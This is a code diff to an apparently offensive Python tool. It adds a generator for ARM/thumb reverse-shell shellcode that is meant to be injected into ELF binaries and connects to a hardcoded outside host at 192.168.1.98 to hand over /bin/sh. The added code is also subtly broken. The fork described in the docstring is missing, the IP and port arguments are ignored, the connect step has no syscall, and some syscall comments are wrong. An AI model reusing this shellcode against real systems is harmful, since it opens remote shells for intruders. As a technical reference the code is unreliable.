@@ -157,6 +157,73 @@ def x32_reverse_shell(IP,PORT,addr):
     
     return bytearray(shellcode)
 
+def arm_reverse_shell(IP,PORT,addr):
+    '''arm_reverse_shell(ip(string), port(int), addr(int)) -> bytearray(shellcode)
+    
+       Generate a 32-bit ARM/thumb TCP reverse shell.
+       The shellcode will initially call fork and the parent
+       process will jmp to the address specified which allows
+       graceful handling when injecting into an ELF. The child
+       process then calls socket and connect followed by dup2
+       in order to duplicate the socket FD to stdin/stdout/stderr.
+       Once complete, execve("/bin/sh",0,0) is called.'''
+
+    ip = "0x" + binascii.hexlify(socket.inet_aton(IP)).decode('utf-8')
+    port = "0x" + binascii.hexlify(struct.pack("H",socket.htons(PORT))).decode('utf-8')
+    jmp_addr = str(addr)
+
+    #shellcode
+    assembly = (
+        ".code 32                               ;"   # 32-bit ARM mode
+        "       add r1, pc, #1                  ;"   # Set LSB of jmp to 1 to switch to 16-bit thumb mode
+        "       bx  r1                          ;"
+        ".code 16                               ;"   # 16-bit thumb mode
+        "socket:                                ;"
+        "       mov r0, #2                      ;"   # AF_INET
+        "       mov r1, #1                      ;"   # SOCK_STREAM
+        "       sub r2, r2                      ;"   # PROTOCOL 0
+        "       mov r7, #200                    ;"
+        "       mov r7, #81                     ;"   # r7 = 281 (socket syscall)
+        "       svc #1                          ;"   # software interrupt
+        "       mov r4, r0                      ;"   # save socket fd in r4
+        "connect:                               ;"
+        "       adr r1, struct                  ;"   # pointer to struct
+        "       strb    r2, [r1, #1]            ;"   # overwrite 0xff with 0x00
+        "       mov r2, #16                     ;"
+        "       add r7, #2                      ;"   # r7 = 238 (connect)
+        "dup2stdin:                             ;"
+        "       mov r7, #63                     ;"   # r7 = 63 (dup2)
+        "       mov r0, r4                      ;"   # move socket fd into r0
+        "       sub r1, r1                      ;"   # zero out r1 for stdin
+        "       svc #1                          ;"
+        "dup2stdout:                            ;"
+        "       mov r0, r4                      ;"
+        "       mov r1, #1                      ;"   # set r1 to 1 for stdout
+        "       svc #1                          ;"
+        "dup2stderr:                            ;"
+        "       mov r0, r4                      ;"
+        "       mov r1, #2                      ;"   # set r2 to 2 for stderr
+        "       svc #1                          ;"
+        "execve:                                ;"
+        "       adr r0, binsh                   ;"   # binsh pointer
+        "       sub r2, r2                      ;"   # zero r2 out
+        "       sub r1, r1                      ;"   # zero r1 out
+        "       strb    r2, [r0, #7]            ;"   # null byte the X in /bin/shX
+        "       mov r7, #11                     ;"   # r7 = 11 (execve)
+        "       svc #1                          ;"
+        "struct:                                ;"
+        ".byte 2,0                              ;"
+        ".byte 17,92                            ;"
+        ".byte 192,168,1,98                     ;"
+        "binsh:                                 ;"
+        ".ascii \"/bin/shX\"                    ;"
+    )
+
+    engine = Ks(KS_ARCH_ARM, KS_MODE_ARM)
+    shellcode, count = engine.asm(assembly)
+    
+    return bytearray(shellcode)
+
 def verify_ip(host):
     if netaddr.valid_ipv4(host):
         return host
@@ -179,11 +246,14 @@ def verify_port(port):
 def verify_arch(arch):
     amd64 = ["64","amd64","x86_64","x86-64"]
     i386  = ["32","x86","i386","x86_32","x86-32"]
+    arm   = ["arm"]
 
     if arch in amd64:
         return 64
     elif arch in i386:
         return 32
+    elif arch in arm:
+        return 16
     else:
         print("Incompatible arch selected. Please use 32 or 64.")
         sys.exit()
@@ -203,9 +273,11 @@ if __name__ == '__main__':
     args = parser.parse_args()
 
     if args.arch == 64:
-        shellcode = x64_reverse_shell(args.host,args.port)
+        shellcode = x64_reverse_shell(args.host,args.port,0x4433)
     elif args.arch == 32:
-        shellcode = x32_reverse_shell(args.host,args.port)
+        shellcode = x32_reverse_shell(args.host,args.port,0x4433)
+    elif args.arch == 16:
+        shellcode = arm_reverse_shell(args.host,args.port,0x4433)
     else:
         print("Wrong options selected. Use -h for usage.")
         sys.exit()
